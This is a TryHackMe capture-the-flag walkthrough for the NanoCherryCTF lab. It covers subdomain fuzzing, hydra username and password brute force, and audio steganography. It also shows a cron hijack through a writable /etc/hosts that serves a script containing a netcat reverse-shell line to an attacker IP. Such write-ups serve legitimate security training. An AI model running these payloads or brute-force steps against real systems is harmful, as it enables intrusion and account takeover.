---
title: NanoCherryCTF
date: 2024-07-22 17:00:00 +0200
categories: [TryHackMe]
tags: [Web, Subdomain, Information Disclosure, Brute Force, Steganography]
description: Explore a double-sided site and escalate to root!
render_with_liquid: false
comments: true
media_subpath: /assets/img/thm_images/tryhackme_nanoCherryCTF/
image:
    path: room.png
---

## Room
![Room Card](room_card.png){: w="300" h="300" .center .shadow}

- **Title:** NanoCherry 2-3
- **Name:** [NanoCherryCTF](https://tryhackme.com/r/room/nanocherryctf)
- **Description:** Explore a double-sided site and escalate to root!

### Flags

1.  Gain access to Molly's Dashboard. What is the flag?
2.  What is the first part of Chad Cherry's password?
3.  What is the second part of Chad Cherry's password?
4.  What is the third part of Chad Cherry's password?
5.  Put the three parts of Chad Cherry's password together and access his account. What is the flag you obtained?
6.  What is the root flag?

### Author
- **Name:** [m3gakr4nus](https://tryhackme.com/p/m3gakr4nus)
- **Duration:** 2024-07-22 - 2024-07-28

## Enumeration
Let's add `cherryontop.thm` to our `/etc/hosts`
We have been provided some credentials but let's run an nmap scan anyway.
```bash
nmap -v -Pn -T4 -sS -A -p- -oN portscan.nmap cherryontop.thm
```

```text
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9e:e6:fd:19:23:a3:b1:40:77:1c:a4:c4:2f:e6:d3:4b (ECDSA)
|_  256 15:2b:23:73:3f:c8:8a:a3:b4:aa:1d:ae:70:d4:5f:ae (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Cherry on Top Ice Cream Shop
|_http-server-header: Apache/2.4.52 (Ubuntu)
```

It doesn't look like much is going on so let's move on...
## Flag 4 - The third part of Chad Cherry's password
Let's connect to the machine over SSH with the credentials provided:
**Username:** notsus
**Password:** dontbeascriptkiddie

We see two files, `backdoor.mp4` and `youFoundIt.txt`:
![d1a76a999122fd40d1ebf2f4a351028a.png](d1a76a999122fd40d1ebf2f4a351028a.png){: w="500" h="300" .center}
- After reading the text, it's clear that our target is Bob-Boba
- The `backdoor.mp4` doesn't really provide any new information but it's a nice touch :)
- These are all the users on the machine:

![2b15d7c567833719729c93aab0193cc8.png](2b15d7c567833719729c93aab0193cc8.png){: w="400" h="300" .center}


I'll use `linpeas` for enumeration
```bash
scp linpeas.sh notsus@cherryontop.thm:linpeas.sh
```
- Linpeas found this crontab entry
- `curl` will try to get the contents of `cherryontop.tld:8000/home/bob-boba/coinflip.sh` and execute it every minute.

![a3058cfc2b223a77969c5fb8755f8b45.png](a3058cfc2b223a77969c5fb8755f8b45.png){: w="600" h="300" .center}

- `/etc/hosts` is also writable so it becomes clear what needs to be done here

![e850a0bdd5d1ba50da45387cce9ba4c7.png](e850a0bdd5d1ba50da45387cce9ba4c7.png){: w="600" h="300" .center}

We simply have to edit the `/etc/hosts` file to point the `cherryontop.tld` domain to our machine.
Then we add the file `coinflip.sh` containing a payload with it's parent directories to our machine and run a webserver on port `8000`
Once the crontab gets executed, it will get the contents of **our coinflip.sh** and execute it on the target system:

```bash
# Run on victim machine
echo "<attacker_ip> cherryontop.tld" >> /etc/hosts 
```
```bash
# Run on attacker machine
mkdir -p ./home/bob-boba
echo "nc.traditional <attacker_ip> 53 -e /bin/bash" > ./home/bob-boba/coinflip.sh
python3 -m http.server 8000
nc -lvnp 53
```

- After about a minute or so, we see that a **GET request** is made to retrieve the file `coinflip.sh`

![d9acc6f31333501d9ed09cd2fdfdc5c2.png](d9acc6f31333501d9ed09cd2fdfdc5c2.png){: w="600" h="300" .center}

- It is then executed which gives us a reverse shell

![0ee37e490fbaa4b91cec76c76237bea3.png](0ee37e490fbaa4b91cec76c76237bea3.png){: w="500" h="300" .center}

In the file called `bobLog.txt`, we learn that bob has a segment of chad's password. 
The file `chads-key3.txt` contains the password segment:

![f95a1eecc2a8462335739fe3ee00f914.png](f95a1eecc2a8462335739fe3ee00f914.png){: w="600" h="300" .center}

## Flag 1 - Molly's Dashboard
Let's add `cherryontop.thm` to our `/etc/hosts` and navigate to the website.
![a1e5c4ac4d87bbf286ba4141c2e9c291.png](a1e5c4ac4d87bbf286ba4141c2e9c291.png){: w="500" h="300" .center}

After scrolling down I came across this video:

![9ca30e06006db4bc1d1c72662fdf56c5.png](9ca30e06006db4bc1d1c72662fdf56c5.png){: w="400" h="300" .center}

A hint was given within this video that there is a **secret club** and If we are part of it, we should **"check those subdomains"**

We're also given some information about the people who work at this company:

![aed45669d26e25adc556392309703a90.png](aed45669d26e25adc556392309703a90.png){: w="500" h="300" .center}


I will now run `gobuster` for some directory and file enumeration and `wfuzz` to look for subdomains:
```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -u http://cherryontop.thm -x php,html,txt -o gobuster.txt
```

```bash
wfuzz -u "http://cherryontop.thm" -H "Host: FUZZ.cherryontop.thm" -w /usr/share/wordlists/seclists/Discovery/subdomains-top1million-110000.txt -c --hw 839
```

### Gobuster results
The only lead that gobuster could identify was `/content.php`
Here we have 4 different facts which we can request as the user `Guest`

![afd94ee6a7cfbb8d7a7ed0168299e17f.png](afd94ee6a7cfbb8d7a7ed0168299e17f.png){: w="600" h="300" .center}

change the fact number to `-1` causes an error:

![468c3506af6265e6073702a0fa16a579.png](468c3506af6265e6073702a0fa16a579.png){: w="300" h="300" .center}

Actually any number that is not between 1-4.
Now I could go ahead and fuzz this number with `burp` to see if I find something but my main focus is the subdomains which was hinted at in the video

### wFuzz
wFuzz was able to identify 1 subdomain called `nano`
Let's add `nano.cherryontop.thm` to our `/etc/hosts`

Navigating to `nano.cherryontop.thm`, we see the dark side of the innocent ice cream shop. **A NANO CULT**

![80f098c186d01e01479b390b9a62d615.png](80f098c186d01e01479b390b9a62d615.png){: w="500" h="300" .center}

We see a login page as well: `/login.php`

![95999ae4f6fed34b091f83ef0012d699.png](95999ae4f6fed34b091f83ef0012d699.png){: w="500" h="300" .center}

The innocent people we saw at the ice cream shop aren't that innocent after all!

![381fb7f699d3d6cc29079ebcf44c03de.png](381fb7f699d3d6cc29079ebcf44c03de.png){: w="500" h="300" .center}
![0e9b19939aa4629ac46a0759ea560190.png](0e9b19939aa4629ac46a0759ea560190.png){: w="500" h="300" .center}

I noticed that the admin portal has an **Information Disclosure** vulnerability.
The application will tell you if the entered user exists or not.

![562c31bd7e0ca4cda042caa8fc679bb4.png](562c31bd7e0ca4cda042caa8fc679bb4.png){: w="300" h="300" .center}

We can do some user enumeration with hydra:
```bash
hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p placeholder nano.cherryontop.thm http-post-form "/login.php:username=^USER^&password=^PASS^&submit=:F=This user doesn't exist"
```

- hydra identified `puppet` as a valid user:
![1bb4245e16a84109903f09173d9c6dc2.png](1bb4245e16a84109903f09173d9c6dc2.png){: w="500" h="300" .center}

- Now when trying to login with `puppet`, we get a different error message
![7c7534d350bdadef40e7045ff323424c.png](7c7534d350bdadef40e7045ff323424c.png){: w="300" h="300" .center}

I let hydra run for another 10 minutes but no other user's were found.
Let's try brute-forcing `puppet`'s password:
```bash
hydra -l puppet -P /usr/share/wordlists/rockyou.txt nano.cherryontop.thm http-post-form "/login.php:username=^USER^&password=^PASS^&submit=:F=Bad password"
```
- hydra quickly cracks the password:

![f1924bbd56b141c40f56b229b9bb167d.png](f1924bbd56b141c40f56b229b9bb167d.png){: w="500" h="300" .center}

Let's login and see what's waiting for us:

![5b520c9136a896d226fa64889bfd6669.png](5b520c9136a896d226fa64889bfd6669.png){: w="500" h="300" .center}

A flag... a flag was waiting for us :)

## Flag 2 - The first part of Chad Cherry's password
After reading through the victims that are listed on the site, we see that molly straight up gives us her SSH password while talking about Jex:

![77b44a493d38bcdc7194c6ad3bae4e35.png](77b44a493d38bcdc7194c6ad3bae4e35.png){: w="200" h="200" .center}

Logging in as `molly-milk` with the password provided we can see two files.
`DONTLOOKCHAD.txt` which contains a SWEET poem (get it? XD) and the `chads-key1.txt` file which contains the first part of `chard cherry`'s password.
![325810665136fd777639a675e915d335.png](325810665136fd777639a675e915d335.png){: w="700" h="300" .center}



## Flag 3 - The second part of Chad Cherry's password
I couldn't find any further escalation point form `molly`'s account. I went back to to my notes and remembered the `http://cherryontop.thm/content.php` page. I started fuzzing the `facts` parameter from `-9999` to `9999`:
![0ffde7d1ab70050d96a82bfc7bd15127.png](0ffde7d1ab70050d96a82bfc7bd15127.png){: w="700" h="300" .center}

```text
PAYLOAD         MESSAGE
-------         -------
1               Ice Cream was first invented in 1777
2               There are 6 main types of sprinkles for different situations
3               In 2016, China ate 4.3 billion liters of ice cream.
4               During economic recessions, ice cream sales tend to increase
20              Nope! Just Nope.
43              Nice try! You can't touch my stuff!
50              No secret notes for you!
64              No Easter eggs for you!
```

Nothing too great but at least we're on the right path. Since the only user left to compromise is `sam-sprinkles`, I encoded "sam-sprinkles" in `base32` and submitted the requests manually with the payloads found above.

**Payload number 43** gave me what I needed:
![c61afc15700a1c41e5d7e98fc55009f1.png](c61afc15700a1c41e5d7e98fc55009f1.png){: w="700" h="300" .center}

After logging in, we see two files `whyChadWhy??.txt` and `chads-key2.txt`.
As always, the `chads-key2.txt` contains the password segment:

![06987adf5c6cd778604c8c73c9fb4464.png](06987adf5c6cd778604c8c73c9fb4464.png){: w="600" h="300" .center}

## Flag 5 - Chad Cherry's account flag
After putting the password segments together and trying it, we successfully login as `chad-cherry`:
![538918fd5bfbff9bec952a52010a3b7b.png](538918fd5bfbff9bec952a52010a3b7b.png){: w="300" h="300" .center}

The file `chad-flag.txt` contains what we're looking for:
![cb3b2f2e453f5a0c4352056954bdfe39.png](cb3b2f2e453f5a0c4352056954bdfe39.png){: w="300" h="300" .center}
 
## Flag 6 - Root flag
The `Hello.txt` file tells us where we can find root's password:
![0b3e3bf364cf532527a1625bbac5908c.png](0b3e3bf364cf532527a1625bbac5908c.png){: w="700" h="300" .center}

There's a file called `rootPassword.wav`. Let's transfer it to our machine:
```bash
scp chad-cherry@cherryontop.thm:rootPassword.wav ./rootPassword.wav
```

I recommend you to turn the volume down if you're going to listen to the file. I almost went deaf XD
Listening to the file doesn't help since it's just a bunch of high-pitched notes being played.

After inspecting the spectogram, there were no hidden messages inside it:
![5c57a77dc82222b615c4bd2dd75d3b0e.png](5c57a77dc82222b615c4bd2dd75d3b0e.png){: w="700" h="300" .center}

I started researching different WAV-file stegonography techniques. That's when I came across `SSTV` [in this article](https://sumit-arora.medium.com/audio-steganography-the-art-of-hiding-secrets-within-earshot-part-2-of-2-c76b1be719b3)

>SSTV is an acronym for Slow-Scan Television, which is a very popular method in radio transmission to send image data over a long distance via ionoshperic propagation. SSTV enables transmission of images in places where very little bandwidth is available, for example, over the Plain Old Telephone Service(POTS) line. In fact, Apollo 11 moon mission had used SSTV to transmit images back to earth.
>
>SSTV is based on analog frequency modulation, that looks at the brightness of each pixel and the accordingly allocates a different audio frequency for it. Usually, SSTV is used to transfer greyscale images, we can also use it to transfer colored images with some loss in image resolution.

So I started looking for tools to decode the `SSTV` for me and [I found this](https://github.com/colaclanth/sstv)

```bash
git clone https://github.com/colaclanth/sstv.git
sudo python3 setup.py install

sstv -d rootPassword.wav -o output.png
```

The `output.png` should contain **root's password**:

![3816749d063ffb616ba1ff38a89ed11f.png](3816749d063ffb616ba1ff38a89ed11f.png){: w="400" h="300" .center}

You can find the root flag inside root's home directory:

![0a95efc1fdd42a64304a79946f8542c2.png](0a95efc1fdd42a64304a79946f8542c2.png){: w="400" h="300" .center}

## Outro
This room was one of the most fun rooms that I've played in a while. I can't imagine the time and effort that went into creating it. It was definitely a unique and interesting room with all the videos and the funny story that kept the journey entertaining.

Many thanks to the creator of this room ([dsneddon00](https://tryhackme.com/p/dsneddon00)) and everyone who helped create this room.

\- m3gakr4nus
